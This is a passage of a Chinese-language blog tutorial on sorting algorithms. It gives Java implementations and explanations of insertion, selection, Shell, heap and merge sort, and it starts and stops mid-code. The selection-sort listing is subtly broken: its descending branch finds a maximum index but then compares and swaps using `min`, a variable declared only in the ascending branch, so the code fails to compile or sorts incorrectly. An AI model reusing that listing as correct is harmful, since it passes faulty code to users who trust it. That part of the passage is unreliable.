class="number">0</span>&amp;&amp;tmp&lt;array[j-<span class="number">1</span>];j--)&#123;</span><br><span class="line">                array[j]=array[j-<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            array[j]=tmp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;len;i++)&#123;</span><br><span class="line">            tmp=array[i];</span><br><span class="line">            <span class="keyword">for</span>(j=i;j&gt;<span class="number">0</span>&amp;&amp;tmp&gt;array[j-<span class="number">1</span>];j--)&#123;</span><br><span class="line">                array[j]=array[j-<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            array[j]=tmp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1-4-算法复杂度分析-1"><a href="#1-4-算法复杂度分析-1" class="headerlink" title="1.4 算法复杂度分析"></a>1.4 算法复杂度分析</h3><p>　　插入排序在最好情况下，需要比较n-1次，无需交换元素，时间复杂度为O(n);在最坏情况下，时间复杂度依然为O(n²)。</p><h2 id="3-选择排序"><a href="#3-选择排序" class="headerlink" title="3 选择排序"></a>3 选择排序</h2><h3 id="1-1-算法描述-2"><a href="#1-1-算法描述-2" class="headerlink" title="1.1 算法描述"></a>1.1 算法描述</h3><p>　　选择排序(Selection-sort)是一种简单直观的排序算法。它的工作原理：首先在未排序序列中找到最小（大）元素，存放到排序序列的起始位置，然后，再从剩余未排序元素中继续寻找最小（大）元素，然后放到已排序序列的末尾。以此类推，直到所有元素均排序完毕。 </p><p>　　n个记录的直接选择排序可经过n-1趟直接选择排序得到有序结果。具体算法描述如下：</p><ul><li>初始状态：无序区为R[1..n]，有序区为空；</li><li>第i趟排序(i=1,2,3…n-1)开始时，当前有序区和无序区分别为R[1..i-1]和R(i..n）。该趟排序从当前无序区中-选出关键字最小的记录 R[k]，将它与无序区的第1个记录R交换，使R[1..i]和R[i+1..n)分别变为记录个数增加1个的新有序区和记录个数减少1个的新无序区；</li><li>n-1趟结束，数组有序化了。</li></ul><h3 id="1-2-动图演示-1"><a href="#1-2-动图演示-1" class="headerlink" title="1.2 动图演示"></a>1.2 动图演示</h3><p><img src="https://lxzh.oss-cn-hangzhou.aliyuncs.com/markdown/sort/selectsort2.gif" alt="选择排序演示图2"></p><h3 id="1-3-代码实现-2"><a href="#1-3-代码实现-2" class="headerlink" title="1.3 代码实现"></a>1.3 代码实现</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 选择排序</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> array 待排序的数组</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> asc   是否为升序排序模式 true:升序 false:降序</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">SelectSort</span><span class="params">(<span class="keyword">int</span>[] array,<span class="keyword">boolean</span> asc)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> len=array.length;</span><br><span class="line">    <span class="keyword">if</span>(asc)&#123;</span><br><span class="line">        <span class="comment">//每一轮循环未排序序列中找到最小元素的下标min</span></span><br><span class="line">        <span class="keyword">int</span> min;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len-<span class="number">1</span>;i++)&#123;</span><br><span class="line">            min=i;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=i+<span class="number">1</span>;j&lt;len;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(array[j]&lt;array[min])&#123;</span><br><span class="line">                    min=j;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(i!=min)&#123;</span><br><span class="line">                <span class="comment">//最小元素依次与未排序序列首元素交换(放置于已排序序列末尾)</span></span><br><span class="line">                Swap(array,i,min);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">int</span> max;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len-<span class="number">1</span>;i++)&#123;</span><br><span class="line">            max=i;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=i+<span class="number">1</span>;j&lt;len;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(array[j]&gt;array[max])&#123;</span><br><span class="line">                    max=j;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(i!=min)&#123;</span><br><span class="line">                Swap(array,i,min);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4-希尔排序"><a href="#4-希尔排序" class="headerlink" title="4 希尔排序"></a>4 希尔排序</h2><blockquote><p>　　1959年Shell发明，第一个突破O(n²)的排序算法，是简单插入排序的改进版。它与插入排序的不同之处在于，它会优先比较距离较远的元素。希尔排序又叫<strong>缩小增量排序</strong>。</p></blockquote><h3 id="1-1-算法描述-3"><a href="#1-1-算法描述-3" class="headerlink" title="1.1 算法描述"></a>1.1 算法描述</h3><p>　　先将整个待排序的记录序列分割成为若干子序列分别进行直接插入排序，具体算法描述：</p><ul><li>选择一个增量序列t1，t2，…，tk，其中ti&gt;tj，tk=1；</li><li>按增量序列个数k，对序列进行k 趟排序；</li><li>每趟排序，根据对应的增量ti，将待排序列分割成若干长度为m 的子序列，分别对各子表进行直接插入排序。仅增量因子为1 时，整个序列作为一个表来处理，表长度即为整个序列的长度。</li></ul><h3 id="1-2-动图演示-2"><a href="#1-2-动图演示-2" class="headerlink" title="1.2 动图演示"></a>1.2 动图演示</h3><p><img src="https://lxzh.oss-cn-hangzhou.aliyuncs.com/markdown/sort/shellsort1.gif" alt="希尔排序演示图1"><br><img src="https://lxzh.oss-cn-hangzhou.aliyuncs.com/markdown/sort/shellsort2.gif" alt="希尔排序演示图2"></p><h3 id="1-3-代码实现-3"><a href="#1-3-代码实现-3" class="headerlink" title="1.3 代码实现"></a>1.3 代码实现</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 希尔排序 参考:https://www.cnblogs.com/alsf/p/6606287.html</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> array 待排序的数组</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> asc   是否为升序排序模式 true:升序 false:降序</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">ShellSort</span><span class="params">(<span class="keyword">int</span>[] array,<span class="keyword">boolean</span> asc)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> len=array.length;</span><br><span class="line">    <span class="keyword">int</span> h=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(h&lt;len/<span class="number">3</span>)&#123;</span><br><span class="line">        h=h*<span class="number">3</span>+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> tmp;</span><br><span class="line">    <span class="keyword">int</span> j;</span><br><span class="line">    <span class="keyword">if</span>(asc)&#123;</span><br><span class="line">        <span class="keyword">while</span>(h&gt;=<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=h;i&lt;len;i++)&#123;</span><br><span class="line">                tmp=array[i];</span><br><span class="line">                <span class="keyword">for</span>(j=i;j&gt;=h&amp;&amp;tmp&lt;array[j-h];j-=h)&#123;</span><br><span class="line">                    array[j]=array[j-h];</span><br><span class="line">                &#125;</span><br><span class="line">                array[j]=tmp;</span><br><span class="line">            &#125;</span><br><span class="line">            h=h/<span class="number">3</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">while</span>(h&gt;=<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=h;i&lt;len;i++)&#123;</span><br><span class="line">                tmp=array[i];</span><br><span class="line">                <span class="keyword">for</span>(j=i;j&gt;=h&amp;&amp;tmp&gt;array[j-h];j-=h)&#123;</span><br><span class="line">                    array[j]=array[j-h];</span><br><span class="line">                &#125;</span><br><span class="line">                array[j]=tmp;</span><br><span class="line">            &#125;</span><br><span class="line">            h=h/<span class="number">3</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1-4-算法分析"><a href="#1-4-算法分析" class="headerlink" title="1.4 算法分析"></a>1.4 算法分析</h3><p>　　希尔排序的核心在于间隔序列的设定。既可以提前设定好间隔序列，也可以动态的定义间隔序列。动态定义间隔序列的算法是《算法（第4版）》的合著者Robert Sedgewick提出的。　</p><h2 id="5-堆排序"><a href="#5-堆排序" class="headerlink" title="5 堆排序"></a>5 堆排序</h2><h3 id="1-1-算法描述-4"><a href="#1-1-算法描述-4" class="headerlink" title="1.1 算法描述"></a>1.1 算法描述</h3><ul><li><strong>堆排序</strong></li></ul><p>　　堆排序是利用<strong>堆</strong>这种数据结构而设计的一种排序算法，堆排序是一种<strong>选择排序</strong>，它的最坏，最好，平均时间复杂度均为O(n㏒₂n)，它也是不稳定排序。首先简单了解下堆结构。</p><ul><li><strong>堆</strong></li></ul><p>　　堆是具有以下性质的完全二叉树：每个结点的值都大于或等于其左右孩子结点的值，称为<strong>大顶堆</strong>；或者每个结点的值都小于或等于其左右孩子结点的值，称为<strong>小顶堆</strong>。如下图：<br><img src="https://lxzh.oss-cn-hangzhou.aliyuncs.com/markdown/sort/heapsort.png" alt="堆排序示意图"><br>同时，我们对堆中的结点按层进行编号，将这种逻辑结构映射到数组中就是下面这个样子<br><img src="https://lxzh.oss-cn-hangzhou.aliyuncs.com/markdown/sort/heapsort1.png" alt="堆排序示意图1"><br>该数组从逻辑上讲就是一个堆结构，我们用简单的公式来描述一下堆的定义就是：</p><p><strong>大顶堆：arr[i] &gt;= arr[2i+1] &amp;&amp; arr[i] &gt;= arr[2i+2]</strong>  </p><p><strong>小顶堆：arr[i] &lt;= arr[2i+1] &amp;&amp; arr[i] &lt;= arr[2i+2]</strong></p><ul><li><strong>堆排序的基本思想及基本步骤</strong></li></ul><blockquote><p>　　堆排序的基本思想是：将待排序序列构造成一个大顶堆，此时，整个序列的最大值就是堆顶的根节点。将其与末尾元素进行交换，此时末尾就为最大值。然后将剩余n-1个元素重新构造成一个堆，这样会得到n个元素的次小值。如此反复执行，便能得到一个有序序列了.</p></blockquote><p><strong>步骤一 构造初始堆。将给定无序序列构造成一个大顶堆（一般升序采用大顶堆，降序采用小顶堆)。</strong></p><p>　　a.假设给定无序序列结构如下<br><img src="https://lxzh.oss-cn-hangzhou.aliyuncs.com/markdown/sort/heapsort2.png" alt="堆排序示意图2"><br>　　b.此时我们从最后一个非叶子结点开始（叶结点自然不用调整，第一个非叶子结点 arr.length/2-1=5/2-1=1，也就是下面的6结点），从左至右，从下至上进行调整。</p><p><img src="https://lxzh.oss-cn-hangzhou.aliyuncs.com/markdown/sort/heapsort3.png" alt="堆排序示意图3"><br>　　c.找到第二个非叶节点4，由于[4,9,8]中9元素最大，4和9交换。<br><img src="https://lxzh.oss-cn-hangzhou.aliyuncs.com/markdown/sort/heapsort4.png" alt="堆排序示意图4"><br>　　d.这时，交换导致了子根[4,5,6]结构混乱，继续调整，[4,5,6]中6最大，交换4和6。<br><img src="https://lxzh.oss-cn-hangzhou.aliyuncs.com/markdown/sort/heapsort5.png" alt="堆排序示意图5"><br>　　此时，我们就将一个无需序列构造成了一个大顶堆。<br>　　<strong>步骤二 将堆顶元素与末尾元素进行交换，使末尾元素最大。然后继续调整堆，再将堆顶元素与末尾元素交换，得到第二大元素。如此反复进行交换、重建、交换。</strong></p><p>　　a.将堆顶元素9和末尾元素4进行交换<br><img src="https://lxzh.oss-cn-hangzhou.aliyuncs.com/markdown/sort/heapsort6.png" alt="堆排序示意图6"><br>　　b.重新调整结构，使其继续满足堆定义<br><img src="https://lxzh.oss-cn-hangzhou.aliyuncs.com/markdown/sort/heapsort7.png" alt="堆排序示意图7"><br>　　c.再将堆顶元素8与末尾元素5进行交换，得到第二大元素8.<br><img src="https://lxzh.oss-cn-hangzhou.aliyuncs.com/markdown/sort/heapsort8.png" alt="堆排序示意图8"><br>　　后续过程，继续进行调整，交换，如此反复进行，最终使得整个序列有序<br><img src="https://lxzh.oss-cn-hangzhou.aliyuncs.com/markdown/sort/heapsort9.png" alt="堆排序示意图9"></p><p>再简单总结下堆排序的基本思路：</p><p>　　<strong>a.将无需序列构建成一个堆，根据升序降序需求选择大顶堆或小顶堆;</strong><br>　　<strong>b.将堆顶元素与末尾元素交换，将最大元素”沉”到数组末端;</strong><br>　　<strong>c.重新调整结构，使其满足堆定义，然后继续交换堆顶元素与当前末尾元素，反复执行调整+交换步骤，直到整个序列有序。</strong>　　</p><h3 id="1-2-动图演示-3"><a href="#1-2-动图演示-3" class="headerlink" title="1.2 动图演示"></a>1.2 动图演示</h3><p><img src="https://lxzh.oss-cn-hangzhou.aliyuncs.com/markdown/sort/heapsort1.gif" alt="堆排序演示图1"><br><img src="https://lxzh.oss-cn-hangzhou.aliyuncs.com/markdown/sort/heapsort2.gif" alt="堆排序演示图2"></p><h3 id="1-3-代码实现-4"><a href="#1-3-代码实现-4" class="headerlink" title="1.3 代码实现"></a>1.3 代码实现</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 堆排序函数 参考:https://www.cnblogs.com/chengxiao/p/6129630.html</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> array 待排序的数组</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> asc 是否为升序排序模式 true:升序 false:降序</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">HeapSort</span><span class="params">(<span class="keyword">int</span>[] array,<span class="keyword">boolean</span> asc)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> len=array.length;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=len/<span class="number">2</span>-<span class="number">1</span>;i&gt;=<span class="number">0</span>;i--)&#123;</span><br><span class="line">        AdjustHeap(array,i,len,asc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=len-<span class="number">1</span>;i&gt;<span class="number">0</span>;i--)&#123;</span><br><span class="line">        Swap(array,<span class="number">0</span>,i);<span class="comment">//将堆顶元素与最后一个元素交换</span></span><br><span class="line">        AdjustHeap(array,<span class="number">0</span>,i,asc);<span class="comment">//重新调整余下len-1个元素</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 堆排序 堆调整函数</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> array 堆数组</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> i 待调整的节点头元素索引</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> len 待调整的数组长度</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> asc 是否为升序排序模式 true:升序 false:降序</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">AdjustHeap</span><span class="params">(<span class="keyword">int</span>[] array,<span class="keyword">int</span> i,<span class="keyword">int</span> len,<span class="keyword">boolean</span> asc)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> tmp=array[i];<span class="comment">//先取出当前元素i</span></span><br><span class="line">    <span class="keyword">if</span>(asc)&#123;<span class="comment">//升序采用大顶堆</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">2</span>*i+<span class="number">1</span>;k&lt;len;k=k*<span class="number">2</span>+<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(k+<span class="number">1</span>&lt;len&amp;&amp;array[k]&lt;array[k+<span class="number">1</span>])&#123;<span class="comment">//如果左子节点小于右子节点，k指向右子节点</span></span><br><span class="line">                k++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(tmp&lt;array[k])&#123;<span class="comment">//如果跟节点小于子节点</span></span><br><span class="line">                array[i]=array[k];<span class="comment">//根节点赋值为较大子节点</span></span><br><span class="line">                i=k;<span class="comment">//跟节点指向右子节点 迭代</span></span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;<span class="comment">//降序采用小顶堆</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">2</span>*i+<span class="number">1</span>;k&lt;len;k=k*<span class="number">2</span>+<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(k+<span class="number">1</span>&lt;len&amp;&amp;array[k]&gt;array[k+<span class="number">1</span>])&#123;<span class="comment">//如果左子节点大于右子节点，k指向右子节点</span></span><br><span class="line">                k++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(tmp&gt;array[k])&#123;<span class="comment">//如果跟节点大于子节点</span></span><br><span class="line">                array[i]=array[k];<span class="comment">//根节点赋值为较小子节点</span></span><br><span class="line">                i=k;<span class="comment">//跟节点指向右子节点 迭代</span></span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    array[i]=tmp;<span class="comment">//右子节点赋值为跟节点 完成调整</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1-4-算法复杂度分析-2"><a href="#1-4-算法复杂度分析-2" class="headerlink" title="1.4 算法复杂度分析"></a>1.4 算法复杂度分析</h3><p>　　堆排序是一种选择排序，整体主要由构建初始堆+交换堆顶元素和末尾元素并重建堆两部分组成。其中构建初始堆经推导复杂度为O(n)，在交换并重建堆的过程中，需交换n-1次，而重建堆的过程中，根据完全二叉树的性质，[㏒₂(n-1),㏒₂(n-2)…1]逐步递减，近似为n㏒₂n。所以堆排序时间复杂度一般认为就是O(n㏒₂n)级。</p><h2 id="6-归并排序"><a href="#6-归并排序" class="headerlink" title="6 归并排序"></a>6 归并排序</h2><h3 id="1-1-算法描述-5"><a href="#1-1-算法描述-5" class="headerlink" title="1.1 算法描述"></a>1.1 算法描述</h3><p>　　归并排序（MERGE-SORT）是利用<strong>归并</strong>的思想实现的排序方法，该算法采用经典的<strong>分治</strong>（divide-and-conquer）策略（分治法将问题<strong>分(divide)</strong>成一些小的问题然后递归求解，而<strong>治(conquer)</strong>的阶段则将分的阶段得到的各答案”修补”在一起，即分而治之)。</p><ul><li><strong>分而治之</strong><br><img src="https://lxzh.oss-cn-hangzhou.aliyuncs.com/markdown/sort/mergesort.png" alt="归并排序示意图"></li></ul><p>　　可以看到这种结构很像一棵完全二叉树，本文的归并排序我们采用递归去实现（也可采用迭代的方式去实现）。分阶段可以理解为就是递归拆分子序列的过程，递归深度为log2n。</p><ul><li><strong>合并相邻有序子序列</strong></li></ul><p>　　再来看看<strong>治</strong>阶段，我们需要将两个已经有序的子序列合并成一个有序序列，比如上图中的最后一次合并，要将[4,5,7,8]和[1,2,3,6]两个已经有序的子序列，合并为最终序列[1,2,3,4,5,6,7,8]，来看下实现步骤。<br><img src="https://lxzh.oss-cn-hangzhou.aliyuncs.com/markdown/sort/mergesort1.png" alt="归并排序示意图1"><br><img src="https://lxzh.oss-cn-hangzhou.aliyuncs.com/markdown/sort/mergesort2.png" alt="归并排序示意图2"></p><h3 id="1-2-动图演示-4"><a href="#1-2-动图演示-4" class="headerlink" title="1.2 动图演示"></a>1.2 动图演示</h3><p><img src="https://lxzh.oss-cn-hangzhou.aliyuncs.com/markdown/sort/mergesort1.gif" alt="归并排序演示图1"><br><img src="https://lxzh.oss-cn-hangzhou.aliyuncs.com/markdown/sort/mergesort2.gif" alt="归并排序演示图2"></p><h3 id="1-3-代码实现-5"><a href="#1-3-代码实现-5" class="headerlink" title="1.3 代码实现"></a>1.3 代码实现</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 归并排序 参考:https://www.cnblogs.com/chengxiao/p/6194356.html</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> array 待排序的数组</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> asc   是否为升序排序模式 true:升序 false:降序</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">MergeSort</span><span class="params">(<span class="keyword">int</span>[] array,<span class="keyword">boolean</span> asc)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> len=array.length;</span><br><span class="line">    <span class="keyword">int</span>[] tmp=<span class="keyword">new</span> <span class="keyword">int</span>[len];</span><br><span class="line">    MergeSortDivide(array,<span class="number">0</span>,len-<span class="number">1</span>,tmp,asc);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 归并排序(分治)——分</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> array 待排序的数组</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> l     左</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> r     右</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> tmp   与array相同大小的临时数组</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> asc   是否为升序排序模式 true:升序 false:降序</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">MergeSortDivide</span><span class="params">(<span class="keyword">int</span>[] array,<span class="keyword">int</span> l,<span class="keyword">int</span> r,<span class="keyword">int</span>[] tmp,<span class="keyword">boolean</span> asc)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(l&lt;r)&#123;</span><br><span class="line">        <span class="comment">//定义中值值将序列从中间分割</span></span><br><span class="line">        <span class="keyword">int</span> mid=(l+r)/<span class="number">2</span>;</span><br><span class="line">        <span class="comment">//对中值两侧的子序列进行迭代分割</span></span><br><span class="line">        MergeSortDivide(array,l,mid,tmp,asc);</span><br><span class="line">        MergeSortDivide(array,mid+<span class="number">1</span>,r,tmp,asc);</span><br><span class="line">        <span class="comment">//按需合并两个子序列</span></span><br><span class="line">        MergeSortMerge(array,l,mid,r,tmp,asc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 归并排序(分治)——治(合)</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> array 待排序的数组</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> l     左</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> mid   中</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> r     右</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> tmp   与array相同大小的临时数组</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> asc   是否为升序排序模式 true:升序 false:降序</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">MergeSortMerge</span><span class="params">(<span class="keyword">int</span>[] array,<span class="keyword">int</span> l,<span class="keyword">int</span> mid,<span class="keyword">int</span> r,<span class="keyword">int</span>[] tmp,<span class="keyword">boolean</span> asc)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i=l;</span><br><span class="line">    <span class="keyword">int</span> j=mid+<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> k=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(asc)&#123;</span><br><span class="line">        <span class="keyword">while</span>(i&lt;=mid&amp;&amp;j&lt;=r)&#123;</span><br><span class="line">            <span class="comment">//依次选择左右两个子序列中较小值填充到新序列</span></span><br><span class="line">            <span class="keyword">if</span>(array[i]&lt;array[j])&#123;</span><br><span class="line">                tmp[k++]=array[i++];</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                tmp[k++]=array[j++];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span 